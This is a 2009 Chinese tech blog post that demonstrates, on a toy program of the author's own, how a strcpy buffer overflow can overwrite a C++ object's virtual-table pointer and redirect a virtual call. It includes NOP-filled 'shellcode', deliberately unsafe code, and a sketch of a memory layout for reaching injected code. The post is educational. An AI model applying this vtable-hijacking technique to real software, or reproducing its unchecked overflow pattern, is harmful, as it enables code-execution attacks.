---
layout: post
title: "攻击虚函数（意思一下）"
date: 2009-07-21  16:44
comments: true
categories: tech
tags: ["c","c++"]
_baiduhi_id: 1b3b68d959aa3d2510df9b09.html
_baiduhi_category: c&c++
---

(hplonline)2009.7.21<br/><br/>
完全就是意思一下<img src="http://img.baidu.com/hi/jx/j_0016.gif"/>，<br/>
看起来有点假啊。。。<br/>
自己造个东西自己来玩。。<br/><br/>
原理在上一篇的<a href="http://hi.baidu.com/hplonline/blog/item/1bacf81f75e4026af724e485.html" target="_blank">虚函数的底层机制</a><br/><br/>
于是就可以通过改写虚函数表指针来达到执行其他代码的目的。<font color="#0000ff"><br/></font><br/>
下面的shellcode先占够了24个位置，<br/>
然后在程序里面，我们把20开始的双字设置成新的虚函数表的地址。<br/>
因为表项只有1个，所以就用一个int型的变量来假装个表了。<br/><font color="#0000ff"><br/>
程序：</font><br/><br/>
#include &lt;iostream&gt;<br/><br/>
using namespace std ; <br/><br/>
char shellcode[] = {<br/>
0x90 , 0x90 , 0x90 , 0x90 , <br/>
0x90 , 0x90 , 0x90 , 0x90 , <br/>
0x90 , 0x90 , 0x90 , 0x90 , <br/>
0x90 , 0x90 , 0x90 , 0x90 , <br/>
0x90 , 0x90 , 0x90 , 0x90 , <br/>
0x90 , 0x90 , 0x90 , 0x90 , <br/>
0x00<br/>
} ; <br/><br/>
class mycls{<br/>
public:<br/>
     int other_member ;<br/>
     virtual fun(char *s){<br/>
          cout&lt;&lt;"I'm fun"&lt;&lt;endl ;<br/>
          cout&lt;&lt;s&lt;&lt;endl ;<br/>
     }<br/>
} ;<br/><br/>
void f(){<br/>
     cout&lt;&lt;"I'm f"&lt;&lt;endl ;<br/>
}<br/><br/>
int main(){<br/>
     mycls c ;<br/>
     char buf[20] ;<br/>
     mycls *p ;<br/>
     int pf ;<br/>
     pf = (int)f ;//*(int*)*(int*)&amp;c ;<br/>
     *(int*)(shellcode + 20) = (int)&amp;pf ;<br/>
     shellcode[24] = 0 ;<br/>
     strcpy(buf , shellcode) ;<br/>
     p = &amp;c ;<br/>
     p-&gt;fun(buf) ;<br/>
     return 0 ;<br/>
}<br/><br/>
结果：<br/><br/>
I'm f<br/>
（外加一个报错框）<br/><br/><font color="#0000ff">实际上的安排：</font><br/><br/>
上面借助了其他一些地方，而实际上整个内存可以这么安排：<br/><br/>
&lt;shellcode + 4&gt;&lt;nop&gt;&lt;nop&gt;&lt;nop&gt;......&lt;nop&gt;&lt;real code&gt;&lt;nop&gt;...&lt;nop&gt;&lt;shellcode&gt;<br/><br/>
shellcode只开始的地址。于是最后一个&lt;shellcode&gt;作为数据淹没虚函数表的地址。<br/>
执行的时候，会把shellcode开始的地方当作是虚函数表。<br/>
然后查这个表的第一项，得到 shellcode+4 ， <br/>
把这个作为虚函数的实际地址调用，然后就进入到真正的代码段里面了。<br/><br/>
